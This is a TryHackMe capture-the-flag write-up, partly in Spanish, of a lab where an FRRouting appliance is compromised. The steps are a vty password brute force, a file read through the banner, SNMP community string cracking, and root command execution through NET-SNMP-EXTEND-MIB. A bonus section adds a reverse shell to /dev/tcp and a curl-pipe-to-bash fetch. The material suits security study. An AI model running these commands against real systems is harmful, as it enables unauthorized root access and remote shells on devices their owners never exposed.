# Operation Takeover – TryHackMe Writeup

**Status:** WIP / pending final closure.
**Target:** `TARGET_IP` (10.128.162.109 at time of solve)
**OS:** Linux (Network appliance – FRRouting)
**Difficulty:** Medium
**Tech stack:** OpenSSH, FRRouting 10.0 (vty on port 2623), Net-SNMP

---

## Attack Chain Overview

```
nmap → 22, 179 (BGP), 2623 (FRRouting vty)
    →
nc :2623 → FRRouting 10.0, password prompt (Cisco-style single password)
    →
Hydra cisco brute-force → password: arista
    →
enable → arista → privileged mode
    →
configure terminal → banner motd file /etc/frr/frr.conf → reconnect → config leak
    →
mgmt load-config /root/flag.txt merge → banner motd file /etc/frr/mgmt_debug.log → flag
    →
[DEAD END] → pivot to UDP recon
    →
nmap UDP → 161/udp SNMP open
    →
onesixtyone brute-force → community string: pr1v4t3
    →
snmpset NET-SNMP-EXTEND-MIB → RCE as root → flag
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [FRRouting VTY Brute Force](#2-frrouting-vty-brute-force)
3. [Privileged Mode Access](#3-privileged-mode-access)
4. [Configuration and Flag Exfiltration (Dead End)](#4-configuration-and-flag-exfiltration-dead-end)
5. [SNMP Enumeration](#5-snmp-enumeration)
6. [SNMP RCE via NET-SNMP-EXTEND-MIB](#6-snmp-rce-via-net-snmp-extend-mib)
7. [Key Takeaways](#7-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full TCP port scan and service version detection.
# Why here: discover the FRRouting VTY service on port 2623.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
nmap -sVC -p22,2623 $TARGET -oN service
nmap -O $TARGET
```

| Port     | Service              |
|----------|----------------------|
| 22/tcp   | OpenSSH              |
| 179/tcp  | tcpwrapped (BGP)     |
| 2623/tcp | lmdp (FRRouting VTY) |

---

## 2. FRRouting VTY Brute Force

```bash
# What it does: connect to the FRRouting VTY line via netcat.
# Why here: identify the service banner and confirm it uses a single Cisco-style password.
nc -v $TARGET 2623
# FRRouting (version 10.0)
# Password:
```

```bash
# What it does: brute-force the Cisco-style single-password authentication with Hydra.
# Why here: recover the VTY password to gain access to the routing console.
hydra -P /usr/share/wordlists/rockyou.txt $TARGET cisco -s 2623 -t 64 -f
# [2623][cisco] host: $TARGET   password: arista
```

Tools: [hydra](../../../tools/creds/hydra.md), [netcat](../../../tools/pivot/netcat.md).

---

## 3. Privileged Mode Access

```bash
# What it does: enter privileged (enable) mode on the FRRouting console.
# Why here: gain access to configuration commands and file-read primitives.
enable
# Password: arista
```

---

## 4. Configuration and Flag Exfiltration (Dead End)

FRRouting allows exposing local files via `banner motd file`. Pointing this at sensitive
files and reconnecting reveals the content as the MOTD banner.

```bash
# What it does: set the MOTD banner to the contents of the FRR configuration file.
# Why here: exfiltrate the running router configuration by abusing the banner-file feature.
configure terminal
banner motd file /etc/frr/frr.conf
```

```bash
# What it does: reconnect to the VTY to view the banner with the leaked config.
# Why here: read the exfiltrated file content displayed as the login banner.
nc -v $TARGET 2623
```

No encontramos la flag por esta vía. Pivotamos a reconocimiento UDP.

---

## 5. SNMP Enumeration

```bash
# What it does: scan UDP port 161 to check for an exposed SNMP service.
# Why here: TCP recon was exhausted; UDP is the natural next pivot on network appliances.
nmap -sU -p 161 $TARGET
```

```
PORT    STATE         SERVICE
161/udp open|filtered snmp
```

```bash
# What it does: brute-force SNMP community strings using a common wordlist.
# Why here: SNMPv1/v2c authenticates only via community strings;
#           weak or default strings como "public", "private" o "pr1v4t3" son comunes.
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
# Output: $TARGET [pr1v4t3] ...
```

```bash
# What it does: walk the full MIB tree using the discovered community string.
# Why here: enumerate all exposed OIDs to understand what information the agent leaks.
snmpwalk -v2c -c pr1v4t3 $TARGET
```

No encontramos credenciales útiles para el VTY. Sin embargo, la community string
`pr1v4t3` (no `private`) sugiere acceso de lectura-escritura deliberado.

```bash
# What it does: attempt to write a new sysName value via SNMP SET.
# Why here: confirm that the community string grants write access, not just read.
snmpset -v2c -c pr1v4t3 $TARGET .1.3.6.1.2.1.1.5.0 s "Pwned"
snmpget -v2c -c pr1v4t3 $TARGET .1.3.6.1.2.1.1.5.0
# iso.3.6.1.2.1.1.5.0 = STRING: "Pwned"
```

Escritura confirmada. El agente corre Net-SNMP con el módulo `NET-SNMP-EXTEND-MIB`,
lo que permite definir comandos arbitrarios que el agente ejecuta al consultar su subárbol OID.

---

## 6. SNMP RCE via NET-SNMP-EXTEND-MIB

> **Prerequisito en Kali:** los MIBs simbólicos no están instalados por defecto.
> Sin ellos el comando falla con `Unknown Object Identifier`.
>
> ```bash
> sudo apt install snmp-mibs-downloader -y && sudo download-mibs
> sudo sed -i 's/^mibs :/# mibs :/' /etc/snmp/snmp.conf
> ```

```bash
# What it does: register a new SNMP extend entry that executes /bin/bash -c "ls /root".
# Why here: NET-SNMP-EXTEND-MIB lets us define named shell commands that the agent
#           runs on demand; createAndGo activates the entry immediately.
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "ls /root"'
```

```bash
# What it does: walk the NET-SNMP extend output subtree to trigger and read command output.
# Why here: querying .1.3.6.1.4.1.8072.1.3.2 forces the agent to evaluate
#           all registered extend entries and return their stdout.
#
#   1.3.6.1.4.1       → private enterprise space (IANA)
#   8072              → NET-SNMP enterprise ID
#   1.3.6.1.4.1.8072.1.3 → NET-SNMP extend mechanism
#   ...2              → extend output table
snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
# → flag.txt visible in /root
```

```bash
# What it does: update the extend entry to cat the flag.
# Why here: re-issuing createAndGo with the same entry name overwrites the arguments.
#           May need to run twice if the entry is cached.
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "cat /root/flag.txt"'

snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
# → FLAG{...}
```

### Bonus: Reverse Shell

El campo `nsExtendArgs` tiene límite de caracteres. La solución es hostear el payload
en un servidor HTTP y fetchearlo con curl.

```bash
# What it does: create and serve the reverse shell script via Python HTTP server.
# Why here: avoids the character limit in nsExtendArgs.
cat > shell.sh << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/TU_IP/4445 0>&1
EOF
python3 -m http.server 80
```

```bash
# Listener
nc -lnvp 4445
```

```bash
# What it does: fetch and execute the reverse shell via the SNMP extend entry.
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
    'nsExtendStatus."command"'  = createAndGo \
    'nsExtendCommand."command"' = /bin/bash \
    'nsExtendArgs."command"'    = '-c "curl TU_IP/shell.sh|bash"'

snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
```

---

## 7. Key Takeaways

| Lección | Detalle |
|---------|---------|
| Community strings de escritura = RCE | `pr1v4t3` con write access + Net-SNMP → ejecución de comandos arbitrarios como root |
| `NET-SNMP-EXTEND-MIB` es peligroso | Cualquier agente Net-SNMP con write SNMP y este módulo habilitado es vulnerable |
| UDP recon es obligatorio | El vector final estaba en UDP/161, invisible en un escaneo TCP puro |
| MIBs en Kali no vienen instalados | `snmp-mibs-downloader` es necesario; sin él los nombres simbólicos no resuelven |
| Límite de caracteres en args | Para payloads largos, usar curl para fetchear el script en lugar de inline |

---

## Related Notes

- [hydra](../../../tools/creds/hydra.md) — VTY brute force
- [netcat](../../../tools/pivot/netcat.md) — VTY console connection
- [nmap](../../../tools/recon/nmap.md) — Initial port discovery
- [onesixtyone](../../../tools/recon/onesixtyone.md) — SNMP community string brute-forcer
- [snmpwalk](../../../tools/recon/snmpwalk.md) — SNMP MIB tree enumeration
- [snmpset](../../../tools/recon/snmpset.md) — SNMP writing values
- [frrouting-vty-banner-file-read](../../../exploits/network-services/frrouting-vty-banner-file-read.md) — FRRouting banner MOTD local file read
- [snmp-extend-mib-rce](../../../exploits/network-services/snmp-extend-mib-rce.md) — SNMP NET-SNMP-EXTEND-MIB command execution